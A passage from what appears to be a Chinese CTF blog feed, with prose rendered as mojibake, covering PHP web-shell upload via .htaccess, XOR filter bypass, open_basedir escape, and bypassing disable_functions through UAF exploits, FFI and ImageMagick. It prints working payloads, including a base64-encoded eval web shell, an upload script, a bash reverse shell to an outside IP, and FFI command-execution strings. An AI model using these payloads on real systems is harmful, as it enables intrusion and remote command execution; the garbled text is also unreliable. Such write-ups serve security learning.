åˆ¤æ–­ä¸€ä¸ªå›¾åƒçš„ç±»å‹ï¼Œè¯»å–ä¸€ä¸ªå›¾åƒçš„ç¬¬ä¸€ä¸ªå­—èŠ‚å¹¶æ£€æŸ¥å…¶ç­¾åï¼Œæ‰€ä»¥å›¾ç‰‡é©¬çš„å¼€å¤´è¦åŠ ä¸ŠGIF89aï¼Œæ–‡ä»¶å†…å®¹ä¸­ä¸èƒ½æœ‰â€œ&lt;?â€ï¼Œæ‰€ä»¥è¦ç¼–ç ä¸€ä¸‹ï¼ˆåŸç†è¯¦è§.htaccessæ€»ç»“ï¼‰ï¼š</p><pre><code class="hljs abnf"><span class="hljs-attribute">GIF98a12GIF98a12PD9waHAgZXZhbCgkX1JFUVVFU1RbJ2EnXSk7Pz4</span>=</code></pre><p>.htaccess:</p><pre><code class="hljs vala"><span class="hljs-meta">#define width 1</span><span class="hljs-meta">#define height 1</span>AddType application/x-httpd-php .gifphp_value auto_append_file <span class="hljs-string">&quot;php://filter/convert.base64-decode/resource=/var/www/html/upload/tmp_a31f0ebf81054b852f70b3283d8594b8/shell.gif&quot;</span><span class="hljs-meta">#å…ˆéšä¾¿ä¸Šä¼ ä¸ªæ–‡ä»¶ç¡®å®šæ–‡ä»¶å­˜å‚¨ä½ç½®</span></code></pre><p>ä¸‹é¢è¿˜æœ‰ä¸€ä¸ªæ­£åˆ™ï¼š</p><pre><code class="hljs asciidoc">$hhh = @$<span class="hljs-emphasis">_GET[&#x27;_</span>&#x27;];......if ( preg<span class="hljs-emphasis">_match(&#x27;/[\x00- 0-9A-Za-z\&#x27;&quot;\`~_</span>&amp;.,|=[\x7F]+/i&#x27;, $hhh) )<span class="hljs-code">    die(&#x27;Try something else!&#x27;);</span>......eval($hhh);</code></pre><p>ç›´æ¥å¼‚æˆ–ï¼š</p><pre><code class="hljs perl">$&#123;%ff%ff%ff%ff^%a0%b8%ba%ab&#125;&#123;%ff&#125;();&amp;%ff=phpinfo   // &#123;$_GET&#125;&#123;%ff&#125;</code></pre><p>ç„¶åç”¨ä¹‹å‰åœ¨æœ¬åœ°å†™ä¸ªupload.htmlä¸Šä¼ æ–‡ä»¶ï¼Œæˆ–è€…ç”¨è„šæœ¬ä¸Šä¼ çš†å¯</p><pre><code class="hljs perl">import requestsurl = <span class="hljs-string">&quot;http://f627eb1d-1179-494e-ab98-f95610f52fd0.node4.buuoj.cn:81/?_=<span class="hljs-subst">$&#123;%ff%ff%ff%ff^%a0%b8%ba%ab&#125;</span>&#123;%ff&#125;();&amp;%ff=get_the_flag&quot;</span>shell = &#123;<span class="hljs-string">&quot;file&quot;</span>:(<span class="hljs-string">&#x27;shell.gif&#x27;</span>,<span class="hljs-keyword">open</span>(<span class="hljs-string">&#x27;shell.gif&#x27;</span>,<span class="hljs-string">&#x27;rb&#x27;</span>),<span class="hljs-string">&#x27;image/gif&#x27;</span>)&#125;r = requests.post(url=url,files=shell)<span class="hljs-keyword">print</span>(r.text)htaccess = &#123;<span class="hljs-string">&quot;file&quot;</span>:(<span class="hljs-string">&#x27;.htaccess&#x27;</span>,<span class="hljs-keyword">open</span>(<span class="hljs-string">&#x27;.htaccess&#x27;</span>,<span class="hljs-string">&#x27;rb&#x27;</span>),<span class="hljs-string">&#x27;image/gif&#x27;</span>)&#125;r2 = requests.post(url=url,files=htaccess)<span class="hljs-keyword">print</span>(r2.text)</code></pre><p>å¾—åˆ°ç›®å½•</p><p><img src="/2021/08/17/open/1.png" alt="1"></p><p>èšå‰‘è¿æ¥</p><p><img src="/2021/08/17/open/2.png" alt="2"></p><p>æœ‰é™åˆ¶ï¼ŒæŸ¥çœ‹phpinfo</p><p><img src="/2021/08/17/open/3.png" alt="3"></p><p>å¯ç”¨äº†open_basedirï¼Œç”¨ä¸Šé¢çš„int_setæ–¹æ³•</p><p>payload</p><pre><code class="hljs mel">?penson=<span class="hljs-keyword">chdir</span>(%27img%27);ini_set(%27open_basedir%27,%27..%27);<span class="hljs-keyword">chdir</span>(%27..%27);<span class="hljs-keyword">chdir</span>(%27..%27);<span class="hljs-keyword">chdir</span>(%27..%27);<span class="hljs-keyword">chdir</span>(%27..%27);ini_set(%27open_basedir%27,%27/%27);var_dump(scandir(<span class="hljs-string">&#x27;/&#x27;</span>));</code></pre><p>æ‰§è¡Œ:</p><p><img src="/2021/08/17/open/22.png" alt="22"></p><p>è¯»å–</p><pre><code class="hljs mel">penson=<span class="hljs-keyword">chdir</span>(%27img%27);ini_set(%27open_basedir%27,%27..%27);<span class="hljs-keyword">chdir</span>(%27..%27);<span class="hljs-keyword">chdir</span>(%27..%27);<span class="hljs-keyword">chdir</span>(%27..%27);<span class="hljs-keyword">chdir</span>(%27..%27);ini_set(%27open_basedir%27,%27/%27);echo file_get_contents(<span class="hljs-string">&#x27;/THis_Is_tHe_F14g&#x27;</span>);</code></pre><p>æ‰§è¡Œï¼š</p><p><img src="/2021/08/17/open/23.png" alt="23"></p><p>å‚è€ƒï¼š<a href="https://www.jianshu.com/p/cf2cd07d02cf">https://www.jianshu.com/p/cf2cd07d02cf</a></p><p><a href="https://blog.csdn.net/weixin_33810302/article/details/87981560">https://blog.csdn.net/weixin_33810302/article/details/87981560</a></p>]]></content>
    
    
    <categories>
      
      <category>bypass</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>Bypass Disable Functions (ä¸‰)</title>
    <link href="/2021/08/16/ff3/"/>
    <url>/2021/08/16/ff3/</url>
    
    <content type="html"><![CDATA[<h2 id="åˆ©ç”¨-GC-UAF"><a class="header-anchor" href="#åˆ©ç”¨-GC-UAF">ğŸ­</a>åˆ©ç”¨ GC UAF</h2><h4 id="æ¡ä»¶"><a class="header-anchor" href="#æ¡ä»¶">ğŸ­</a>æ¡ä»¶</h4><ul><li>Linux æ“ä½œç³»ç»Ÿ</li><li>PHP ç‰ˆæœ¬(7.x)</li></ul><h4 id="åŸç†"><a class="header-anchor" href="#åŸç†">ğŸ­</a>åŸç†</h4><p>æ­¤æ¼æ´åˆ©ç”¨PHPåƒåœ¾æ”¶é›†å™¨ä¸­å­˜åœ¨ä¸‰å¹´çš„ä¸€ä¸ª <a href="https://bugs.php.net/bug.php?id=72530">bug</a> ï¼Œé€šè¿‡PHPåƒåœ¾æ”¶é›†å™¨ä¸­å †æº¢å‡ºæ¥ç»•è¿‡ <code>disable_functions</code> å¹¶æ‰§è¡Œç³»ç»Ÿå‘½ä»¤ã€‚åˆ©ç”¨è„šæœ¬ï¼š<a href="https://github.com/mm0r1/exploits/tree/master/php7-gc-bypass">https://github.com/mm0r1/exploits/tree/master/php7-gc-bypass</a></p><h4 id="åˆ©ç”¨"><a class="header-anchor" href="#åˆ©ç”¨">ğŸ­</a>åˆ©ç”¨</h4><p>åˆ©ç”¨è„šæœ¬ï¼š<a href="https://github.com/mm0r1/exploits/tree/master/php7-gc-bypass">https://github.com/mm0r1/exploits/tree/master/php7-gc-bypass</a></p><p>åœ¨pwnæ”¾å…¥æ‰§è¡Œå‘½ä»¤ï¼š</p><p><img src="/2021/08/16/ff3/1.png" alt="1"></p><p>ä¹Ÿå¯ä¿®æ”¹æˆ<code>pwn($_POST['a']);</code>è¾ƒä¸ºæ–¹ä¾¿ã€‚</p><p>åˆ©ç”¨æ–¹æ³•ï¼šå°†åˆ©ç”¨è„šæœ¬exploit.phpä¸Šä¼ åˆ°ç›®æ ‡ä¸»æœºæœ‰æƒé™çš„ç›®å½•ï¼Œç„¶åå°†exploit.phpåŒ…å«è¿›æ¥å¹¶ä½¿ç”¨POSTæ–¹æ³•æä¾›ä½ æƒ³è¦æ‰§è¡Œçš„å‘½ä»¤å³å¯ï¼š</p><pre><code class="hljs dts">/?xxx=aW5jbHVkZSgiL3Zhci90bXAvZXhwbG9pdC5waHAiKTs=<span class="hljs-meta"># <span class="hljs-meta-keyword">include</span>(<span class="hljs-string">&quot;/var/tmp/exploit.php&quot;</span>);</span><span class="hljs-symbol">POST:</span> a=ls /</code></pre><p>æˆ–è€…åˆ©ç”¨èšå‰‘çš„æ’ä»¶ï¼šPHP_GC_UAF</p><h2 id="Backtrace-UAF"><a class="header-anchor" href="#Backtrace-UAF">ğŸ­</a>Backtrace UAF</h2><h4 id="æ¡ä»¶-v2"><a class="header-anchor" href="#æ¡ä»¶-v2">ğŸ­</a>æ¡ä»¶</h4><ul><li>Linux æ“ä½œç³»ç»Ÿ</li><li>PHP ç‰ˆæœ¬(7.x)</li></ul><h4 id="åŸç†-v2"><a class="header-anchor" href="#åŸç†-v2">ğŸ­</a>åŸç†</h4><p>è¯¥æ¼æ´åˆ©ç”¨åœ¨debug_backtrace()å‡½æ•°ä¸­ä½¿ç”¨äº†ä¸¤å¹´çš„ä¸€ä¸ª <a href="https://bugs.php.net/bug.php?id=76047">bug</a>ã€‚æˆ‘ä»¬å¯ä»¥è¯±ä½¿å®ƒè¿”å›å¯¹å·²è¢«ç ´åçš„å˜é‡çš„å¼•ç”¨ï¼Œä»è€Œå¯¼è‡´é‡Šæ”¾åä½¿ç”¨æ¼æ´ã€‚</p><h4 id="åˆ©ç”¨-v2"><a class="header-anchor" href="#åˆ©ç”¨-v2">ğŸ­</a>åˆ©ç”¨</h4><p>åˆ©ç”¨è„šæœ¬ï¼š<a href="https://github.com/mm0r1/exploits/tree/master/php7-backtrace-bypass">https://github.com/mm0r1/exploits/tree/master/php7-backtrace-bypass</a></p><p>åˆ©ç”¨æ–¹æ³•ä¸ä¸Šé¢ä¸€æ ·</p><h2 id="åˆ©ç”¨-Json-Serializer-UAF"><a class="header-anchor" href="#åˆ©ç”¨-Json-Serializer-UAF">ğŸ­</a>åˆ©ç”¨ Json Serializer UAF</h2><h4 id="æ¡ä»¶-v3"><a class="header-anchor" href="#æ¡ä»¶-v3">ğŸ­</a>æ¡ä»¶</h4><ul><li>Linux æ“ä½œç³»ç»Ÿ</li><li>PHP ç‰ˆæœ¬<ul><li>7.1 - all versions to date</li><li>7.2 &lt; 7.2.19 (released: 30 May 2019)</li><li>7.3 &lt; 7.3.6 (released: 30 May 2019)</li></ul></li></ul><h4 id="åŸç†-v3"><a class="header-anchor" href="#åŸç†-v3">ğŸ­</a>åŸç†</h4><p>æ­¤æ¼æ´åˆ©ç”¨jsonåºåˆ—åŒ–ç¨‹åºä¸­çš„é‡Šæ”¾åä½¿ç”¨<a href="https://bugs.php.net/bug.php?id=77843">æ¼æ´</a>ï¼Œåˆ©ç”¨jsonåºåˆ—åŒ–ç¨‹åºä¸­çš„å †æº¢å‡ºè§¦å‘ï¼Œä»¥ç»•è¿‡ <code>disable_functions</code> å’Œæ‰§è¡Œç³»ç»Ÿå‘½ä»¤ã€‚</p><h4 id="åˆ©ç”¨-v3"><a class="header-anchor" href="#åˆ©ç”¨-v3">ğŸ­</a>åˆ©ç”¨</h4><p>åˆ©ç”¨è„šæœ¬ï¼š<a href="https://github.com/mm0r1/exploits/tree/master/php-json-bypass">https://github.com/mm0r1/exploits/tree/master/php-json-bypass</a></p><p>åˆ©ç”¨æ–¹æ³•å’Œå…¶ä»–çš„UAFç»•è¿‡disable_functionsç›¸åŒã€‚èšå‰‘ä¹Ÿæœ‰ç›¸å…³æ’ä»¶ Json Serializer UAF</p><h2 id="åˆ©ç”¨-SplDoublyLinkedList-UAC"><a class="header-anchor" href="#åˆ©ç”¨-SplDoublyLinkedList-UAC">ğŸ­</a>åˆ©ç”¨ SplDoublyLinkedList UAC</h2><h4 id="æ¡ä»¶-v4"><a class="header-anchor" href="#æ¡ä»¶-v4">ğŸ­</a>æ¡ä»¶</h4><ul><li>PHP ç‰ˆæœ¬<ul><li>PHP v7.4.10åŠå…¶ä¹‹å‰ç‰ˆæœ¬</li><li>PHP v8.0ï¼ˆAlphaï¼‰</li></ul></li></ul><h4 id="åŸç†-v4"><a class="header-anchor" href="#åŸç†-v4">ğŸ­</a>åŸç†</h4><p>2020å¹´9æœˆ20å·æœ‰äººåœ¨ <a href="http://bugs.php.net">bugs.php.net</a> ä¸Šå‘å¸ƒäº†ä¸€ä¸ªæ–°çš„ UAF <a href="https://bugs.php.net/bug.php?id=80111">BUG</a> ï¼ŒæŠ¥å‘Šäººå·²ç»å†™å‡ºäº† bypass disabled functions çš„åˆ©ç”¨è„šæœ¬å¹¶ä¸”ç§å‘äº†ç»™å®˜æ–¹ï¼Œä¸è¿‡å®˜æ–¹ä¼¼ä¹è¿˜æ²¡æœ‰ä¿®å¤ï¼ŒåŸå› ä¸æ˜ã€‚</p><p>PHPçš„SplDoublyLinkedListåŒå‘é“¾è¡¨åº“ä¸­å­˜åœ¨ä¸€ä¸ªç”¨åé‡Šæ”¾æ¼æ´ï¼Œè¯¥æ¼æ´å°†å…è®¸æ”»å‡»è€…é€šè¿‡è¿è¡ŒPHPä»£ç æ¥è½¬ä¹‰disable_functionsé™åˆ¶å‡½æ•°ã€‚åœ¨è¯¥æ¼æ´çš„å¸®åŠ©ä¸‹ï¼Œè¿œç¨‹æ”»å‡»è€…å°†èƒ½å¤Ÿå®ç°PHPæ²™ç®±é€ƒé€¸ï¼Œå¹¶æ‰§è¡Œä»»æ„ä»£ç ã€‚æ›´å‡†ç¡®åœ°æ¥è¯´ï¼ŒæˆåŠŸåˆ©ç”¨è¯¥æ¼æ´åï¼Œæ”»å‡»è€…å°†èƒ½å¤Ÿç»•è¿‡PHPçš„æŸäº›é™åˆ¶ï¼Œä¾‹å¦‚disable_functionså’Œsafe_modeç­‰ç­‰ã€‚</p><p>è¯¦æƒ…è¯·çœ‹ï¼š<a href="https://www.freebuf.com/articles/web/251017.html">https://www.freebuf.com/articles/web/251017.html</a></p><h3 id="åˆ©ç”¨æ–¹æ³•"><a class="header-anchor" href="#åˆ©ç”¨æ–¹æ³•">ğŸ­</a>åˆ©ç”¨æ–¹æ³•</h3><p>åˆ©ç”¨è„šæœ¬ï¼š<a href="https://xz.aliyun.com/t/8355#toc-3">https://xz.aliyun.com/t/8355#toc-3</a></p><p>éœ€è¦æ‰§è¡Œçš„å‘½ä»¤ï¼š</p><p><img src="/2021/08/16/ff3/2.png" alt="2"></p><p>åˆ©ç”¨æ–¹æ³•ä¸€è‡´</p><h2 id="åˆ©ç”¨-FFI-æ‰©å±•æ‰§è¡Œå‘½ä»¤"><a class="header-anchor" href="#åˆ©ç”¨-FFI-æ‰©å±•æ‰§è¡Œå‘½ä»¤">ğŸ­</a>åˆ©ç”¨ FFI æ‰©å±•æ‰§è¡Œå‘½ä»¤</h2><h4 id="æ¡ä»¶-v5"><a class="header-anchor" href="#æ¡ä»¶-v5">ğŸ­</a>æ¡ä»¶</h4><ul><li>Linux æ“ä½œç³»ç»Ÿ</li><li>PHP &gt;= 7.4</li><li>å¼€å¯äº† FFI æ‰©å±•ä¸” <code>ffi.enable=true</code></li></ul><h4 id="åŸç†-v5"><a class="header-anchor" href="#åŸç†-v5">ğŸ­</a>åŸç†</h4><p>PHP 7.4 çš„ FFIï¼ˆForeign Function Interfaceï¼‰ï¼Œå³å¤–éƒ¨å‡½æ•°æ¥å£ï¼Œå…è®¸ä»ç”¨æˆ·åœ¨PHPä»£ç ä¸­å»è°ƒç”¨Cä»£ç ã€‚FFIçš„ä½¿ç”¨éå¸¸ç®€å•ï¼Œåªç”¨å£°æ˜å’Œè°ƒç”¨ä¸¤æ­¥å°±å¯ä»¥ã€‚</p><p>é¦–å…ˆæˆ‘ä»¬ä½¿ç”¨ <code>FFI::cdef()</code> å‡½æ•°åœ¨PHPä¸­å£°æ˜ä¸€ä¸ªæˆ‘ä»¬è¦è°ƒç”¨çš„è¿™ä¸ªCåº“ä¸­çš„å‡½æ•°ä»¥åŠä½¿ç”¨åˆ°çš„æ•°æ®ç±»å‹ï¼š</p><pre><code class="hljs elixir"><span class="hljs-variable">$ffi</span> = FFI::cdef(<span class="hljs-string">&quot;int system(char* command);&quot;</span>);   <span class="hljs-comment"># å£°æ˜Cè¯­è¨€ä¸­çš„systemå‡½æ•°</span></code></pre><p>è¿”å›ä¸€ä¸ªæ–°åˆ›å»ºçš„FFIå¯¹è±¡ï¼Œç„¶åä½¿ç”¨ä»¥ä¸‹æ–¹æ³•å³å¯è°ƒç”¨è¿™ä¸ªå¯¹è±¡ä¸­æ‰€å£°æ˜çš„å‡½æ•°ï¼š</p><pre><code class="hljs clean">$ffi -&gt;<span class="hljs-keyword">system</span>(<span class="hljs-string">&quot;ls / &gt; /tmp/res.txt&quot;</span>);   # æ‰§è¡Œls /å‘½ä»¤å¹¶å°†ç»“æœå†™å…¥/tmp/res.txt</code></pre><p>ç”±äºsystemå‡½æ•°æ‰§è¡Œå‘½ä»¤æ— å›æ˜¾ï¼Œæ‰€ä»¥éœ€è¦å°†æ‰§è¡Œç»“æœå†™å…¥åˆ°tmpç­‰æœ‰æƒé™çš„ç›®å½•ä¸­ï¼Œæœ€åå†ä½¿ç”¨ <code>echo file_get_contents(&quot;/tmp/res.txt&quot;);</code> æŸ¥çœ‹æ‰§è¡Œç»“æœå³å¯ã€‚å½“PHPæ‰€æœ‰çš„å‘½ä»¤æ‰§è¡Œå‡½æ•°è¢«ç¦ç”¨åï¼Œé€šè¿‡PHP 7.4çš„æ–°ç‰¹æ€§FFIå¯ä»¥å®ç°ç”¨PHPä»£ç è°ƒç”¨Cä»£ç çš„æ–¹å¼ï¼Œå…ˆå£°æ˜Cä¸­çš„å‘½ä»¤æ‰§è¡Œå‡½æ•°æˆ–å…¶ä»–èƒ½å®ç°æˆ‘ä»¬éœ€æ±‚çš„å‡½æ•°ï¼Œç„¶åå†é€šè¿‡FFIå˜é‡è°ƒç”¨è¯¥Cå‡½æ•°å³å¯Bypass disable_functionsã€‚</p><h4 id="åˆ©ç”¨-v4"><a class="header-anchor" href="#åˆ©ç”¨-v4">ğŸ­</a>åˆ©ç”¨</h4><p>é€šè¿‡æå®¢å¤§æŒ‘æˆ˜ 2020]FighterFightsInvinciblyæ¥æ¼”ç¤ºåˆ©ç”¨PHP 7.4 FFIæ¥bypass disable_functionsï¼š</p><p>æºç å¯ä»¥çœ‹åˆ°</p><p><img src="/2021/08/16/ff3/4.png" alt="4"></p><p>å¯ä»¥åŠ¨æ€çš„æ‰§è¡Œphpä»£ç ï¼Œè”æƒ³åˆ°ä¹‹å‰å­¦çš„create_functionä»£ç æ³¨å…¥ï¼š</p><pre><code class="hljs autoit">create_function(<span class="hljs-built_in">string</span> $args,<span class="hljs-built_in">string</span> $code)//<span class="hljs-built_in">string</span> $args å£°æ˜çš„å‡½æ•°å˜é‡éƒ¨åˆ†//<span class="hljs-built_in">string</span> $code æ‰§è¡Œçš„æ–¹æ³•ä»£ç éƒ¨åˆ†</code></pre><p>payload</p><pre><code class="hljs routeros">/?<span class="hljs-attribute">fighter</span>=create_function&amp;fights=&amp;invincibly=;&#125;eval(<span class="hljs-variable">$_POST</span>[whoami]);/*</code></pre><p>èšå‰‘é“¾æ¥æ— æ³•æ‰§è¡Œå‘½ä»¤ï¼ŒæŸ¥çœ‹phpinfo</p><p><img src="/2021/08/16/ff3/6.png" alt="6"></p><p>æ ¹æ®é¢˜ç›®åå­—çš„æè¿°ï¼Œåº”è¯¥æ˜¯è®©æˆ‘ä»¬ä½¿ç”¨PHP 7.4 çš„FFIç»•è¿‡disabled_functionï¼Œphpinfoä¸­ä¹ŸFFIå¤„äºenableçŠ¶æ€</p><h5 id="åˆ©ç”¨FFIè°ƒç”¨Cåº“çš„systemå‡½æ•°"><a class="header-anchor" href="#åˆ©ç”¨FFIè°ƒç”¨Cåº“çš„systemå‡½æ•°">ğŸ­</a>åˆ©ç”¨FFIè°ƒç”¨Cåº“çš„systemå‡½æ•°</h5><p>å…ˆå°è¯•è°ƒç”¨Cåº“çš„systemå‡½æ•°ï¼š</p><pre><code class="hljs php">/?fighter=create_function&amp;fights=&amp;invincibly=;&#125;$ffi = FFI::cdef(<span class="hljs-string">&quot;int system(const char *command);&quot;</span>);$ffi-&gt;system(<span class="hljs-string">&quot;ls / &gt; /tmp/res.txt&quot;</span>);<span class="hljs-keyword">echo</span> file_get_contents(<span class="hljs-string">&quot;/tmp/res.txt&quot;</span>);<span class="hljs-comment">/*</span></code></pre><p>Cåº“çš„systemå‡½æ•°æ‰§è¡Œæ²¡æœ‰å›æ˜¾ï¼Œéœ€è¦å°†æ‰§è¡Œç»“æœå†™å…¥åˆ°tmpç­‰æœ‰æƒé™çš„ç›®å½•ä¸­ï¼Œå†ä½¿ç”¨ <code>echo file_get_contents(&quot;/tmp/res.txt&quot;);</code> æŸ¥çœ‹æ‰§è¡Œç»“æœå³å¯ã€‚ä½†æ˜¯è¿™é“é¢˜æ‰§è¡Œåå´å‘ç°æœ‰ä»»ä½•ç»“æœï¼Œå¯èƒ½æ˜¯æˆ‘ä»¬æ²¡æœ‰å†™æ–‡ä»¶çš„æƒé™ã€‚å°è¯•åå¼¹shellï¼š</p><pre><code class="hljs awk"><span class="hljs-regexp">/?fighter=create_function&amp;fights=&amp;invincibly=;&#125;$ffi = FFI::cdef(&quot;int system(const char *command);&quot;);$ffi-&gt;system(&#x27;bash -c &quot;bash -i &gt;&amp; /</span>dev<span class="hljs-regexp">/tcp/</span><span class="hljs-number">192</span>.xxx.xxx.<span class="hljs-number">72</span><span class="hljs-regexp">/2333 0&gt;&amp;1&quot;&#x27;)/</span>*</code></pre><p>ä¹Ÿä¸è¡Œ</p><h5 id="åˆ©ç”¨FFIè°ƒç”¨Cåº“çš„popenå‡½æ•°"><a class="header-anchor" href="#åˆ©ç”¨FFIè°ƒç”¨Cåº“çš„popenå‡½æ•°">ğŸ­</a>åˆ©ç”¨FFIè°ƒç”¨Cåº“çš„popenå‡½æ•°</h5><pre><code class="hljs stata"><span class="hljs-keyword">FILE</span> *popen(<span class="hljs-keyword">const</span> <span class="hljs-keyword">char</span>* command, <span class="hljs-keyword">const</span> <span class="hljs-keyword">char</span>* <span class="hljs-keyword">type</span>);</code></pre><p>popen()å‡½æ•°ä¼šè°ƒç”¨fork()äº§ç”Ÿå­è¿›ç¨‹ï¼Œç„¶åä»å­è¿›ç¨‹ä¸­è°ƒç”¨ /bin/sh -c æ¥æ‰§è¡Œå‚æ•° command çš„æŒ‡ä»¤ã€‚å‚æ•° type å¯ä½¿ç”¨ â€œrâ€ä»£è¡¨è¯»å–ï¼Œâ€wâ€ä»£è¡¨å†™å…¥ã€‚ä¾ç…§æ­¤typeå€¼ï¼Œpopen()ä¼šå»ºç«‹ç®¡é“è¿åˆ°å­è¿›ç¨‹çš„æ ‡å‡†è¾“å‡ºè®¾å¤‡æˆ–æ ‡å‡†è¾“å…¥è®¾å¤‡ï¼Œç„¶åè¿”å›ä¸€ä¸ªæ–‡ä»¶æŒ‡é’ˆã€‚éšåè¿›ç¨‹ä¾¿å¯åˆ©ç”¨æ­¤æ–‡ä»¶æŒ‡é’ˆæ¥è¯»å–å­è¿›ç¨‹çš„è¾“å‡ºè®¾å¤‡æˆ–æ˜¯å†™å…¥åˆ°å­è¿›ç¨‹çš„æ ‡å‡†è¾“å…¥è®¾å¤‡ä¸­ã€‚æ‰€ä»¥å¯ä»¥åˆ©ç”¨Cåº“çš„popen()å‡½æ•°æ¥æ‰§è¡Œå‘½ä»¤ï¼Œä½†è¦è¯»å–åˆ°ç»“æœè¿˜éœ€è¦Cåº“çš„fgetcç­‰å‡½æ•°ã€‚payloadå¦‚ä¸‹</p><pre><code class="hljs php">/?fighter=create_function&amp;fights=&amp;invincibly=;&#125;$ffi = FFI::cdef(<span class="hljs-string">&quot;void *popen(char*,char*);void pclose(void*);int fgetc(void*);&quot;</span>,<span class="hljs-string">&quot;libc.so.6&quot;</span>);$o = $ffi-&gt;popen(<span class="hljs-string">&quot;ls /&quot;</span>,<span class="hljs-string">&quot;r&quot;</span>);$d = <span class="hljs-string">&quot;&quot;</span>;<span class="hljs-keyword">while</span>(($c = $ffi-&gt;fgetc($o)) != <span class="hljs-number">-1</span>)&#123;$d .= str_pad(strval(dechex($c)),<span class="hljs-number">2</span>,<span class="hljs-string">&quot;0&quot;</span>,<span class="hljs-number">0</span>);&#125;$ffi-&gt;pclose($o);<span class="hljs-keyword">echo</span> hex2bin($d);<span class="hljs-comment">/* </span></code></pre><p>æ‰§è¡Œå‘½ä»¤ï¼š</p><p><img src="/2021/08/16/ff3/7.png" alt="7"></p><h4 id="åˆ©ç”¨FFIè°ƒç”¨PHPæºç ä¸­çš„å‡½æ•°"><a class="header-anchor" href="#åˆ©ç”¨FFIè°ƒç”¨PHPæºç ä¸­çš„å‡½æ•°">ğŸ­</a>åˆ©ç”¨FFIè°ƒç”¨PHPæºç ä¸­çš„å‡½æ•°</h4><p>FFIå¯ä»¥ç›´æ¥è°ƒç”¨phpæºç ä¸­çš„å‡½æ•°ï¼Œæ¯”å¦‚php_exec()å‡½æ•°ï¼Œå½“ä»–å‚æ•°typeä¸º3æ—¶å¯¹åº”ç€è°ƒç”¨çš„æ˜¯passthru()å‡½æ•°ï¼Œå…¶æ‰§è¡Œå‘½ä»¤å¯ä»¥ç›´æ¥å°†ç»“æœåŸå§‹è¾“å‡ºï¼Œpayloadå¦‚ä¸‹ï¼š</p><pre><code class="hljs elixir">/?fighter=create_function&amp;fights=&amp;invincibly=;&#125;<span class="hljs-variable">$ffi</span> = FFI::cdef(<span class="hljs-string">&quot;int php_exec(int type, char *cmd);&quot;</span>);<span class="hljs-variable">$ffi</span>-&gt;php_exec(<span class="hljs-number">3</span>,<span class="hljs-string">&quot;/readflag&quot;</span>);<span class="hljs-regexp">/*</span></code></pre><p>æ‰§è¡Œå‘½ä»¤</p><p><img src="/2021/08/16/ff3/5.png" alt="5"></p><p>å°±ã€‚ã€‚ã€‚ã€‚ã€‚ã€‚ç¦»è°±ï¼Œè¿™ä¸ªflagä¸å®Œæ•´ï¼Ÿï¼Ÿ</p><p>ç”¨èšå‰‘çš„FFIæ’ä»¶</p><p><img src="/2021/08/16/ff3/3.png" alt="3"></p><p>ä¸€æ ·ä¸å®Œæ•´ã€‚ã€‚ã€‚ã€‚ã€‚</p><h2 id="åˆ©ç”¨-ImageMagick"><a class="header-anchor" href="#åˆ©ç”¨-ImageMagick">ğŸ­</a>åˆ©ç”¨ ImageMagick</h2><h4 id="æ¡ä»¶-v6"><a class="header-anchor" href="#æ¡ä»¶-v6">ğŸ­</a>æ¡ä»¶</h4><ul><li>ç›®æ ‡ä¸»æœºå®‰è£…äº†æ¼æ´ç‰ˆæœ¬çš„imagemagickï¼ˆ&lt;= 3.3.0ï¼‰</li><li>å®‰è£…äº†php-imagickæ‹“å±•å¹¶åœ¨php.iniä¸­å¯ç”¨ï¼›</li><li>ç¼–å†™phpé€šè¿‡new Imagickå¯¹è±¡çš„æ–¹å¼æ¥å¤„ç†å›¾ç‰‡ç­‰æ ¼å¼æ–‡ä»¶ï¼›</li><li>PHP &gt;= 5.4</li></ul><h4 id="åŸç†-v6"><a class="header-anchor" href="#åŸç†-v6">ğŸ­</a>åŸç†</h4><p>imagemagickæ˜¯ä¸€ä¸ªç”¨äºå¤„ç†å›¾ç‰‡çš„ç¨‹åºï¼Œå®ƒå¯ä»¥è¯»å–ã€è½¬æ¢ã€å†™å…¥å¤šç§æ ¼å¼çš„å›¾ç‰‡ã€‚å›¾ç‰‡åˆ‡å‰²ã€é¢œè‰²æ›¿æ¢ã€å„ç§æ•ˆæœçš„åº”ç”¨ï¼Œå›¾ç‰‡çš„æ—‹è½¬ã€ç»„åˆï¼Œæ–‡æœ¬ï¼Œç›´çº¿ï¼Œå¤šè¾¹å½¢ï¼Œæ¤­åœ†ï¼Œæ›²çº¿ï¼Œé™„åŠ åˆ°å›¾ç‰‡ä¼¸å±•æ—‹è½¬ã€‚</p><p>è¿™é‡Œåˆ©ç”¨çš„æ˜¯ImageMagickçš„ä¸€ä¸ªæ¼æ´ï¼ˆCVE-2016-3714ï¼‰ã€‚åªè¦å°†ç²¾å¿ƒæ„é€ çš„å›¾ç‰‡ä¸Šä¼ è‡³ä½¿ç”¨æ¼æ´ç‰ˆæœ¬çš„ImageMagickï¼ŒImageMagickä¼šè‡ªåŠ¨å¯¹å…¶æ ¼å¼è¿›è¡Œè½¬æ¢ï¼Œè½¬æ¢è¿‡ç¨‹ä¸­å°±ä¼šæ‰§è¡Œæ”»å‡»è€…æ’å…¥åœ¨å›¾ç‰‡ä¸­çš„å‘½ä»¤ã€‚å› æ­¤å¾ˆå¤šå…·æœ‰å¤´åƒä¸Šä¼ ã€å›¾ç‰‡è½¬æ¢ã€å›¾ç‰‡ç¼–è¾‘ç­‰å…·å¤‡å›¾ç‰‡ä¸Šä¼ åŠŸèƒ½çš„ç½‘ç«™éƒ½å¯èƒ½ä¼šä¸­æ‹›ã€‚å¦‚æœåœ¨phpinfoä¸­çœ‹åˆ°ImageMagickï¼Œå°±å¯ä»¥å°è¯•ã€‚</p><h4 id="åˆ©ç”¨-v5"><a class="header-anchor" href="#åˆ©ç”¨-v5">ğŸ­</a>åˆ©ç”¨</h4><p>åˆ©ç”¨è„šæœ¬ï¼š</p><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;Disable Functions: &quot;</span> . ini_get(<span class="hljs-string">&#x27;disable_functions&#x27;</span>) . <span class="hljs-string">&quot;\n&quot;</span>;$command = PHP_SAPI == <span class="hljs-string">&#x27;cli&#x27;</span> ? $argv[<span class="hljs-number">1</span>] : $_GET[<span class="hljs-string">&#x27;cmd&#x27;</span>];<span class="hljs-keyword">if</span> ($command == <span class="hljs-string">&#x27;&#x27;</span>) &#123;   $command = <span class="hljs-string">&#x27;id&#x27;</span>;&#125;$exploit = &lt;&lt;&lt;EOFpush graphic-contextviewbox <span class="hljs-number">0</span> <span class="hljs-number">0</span> <span 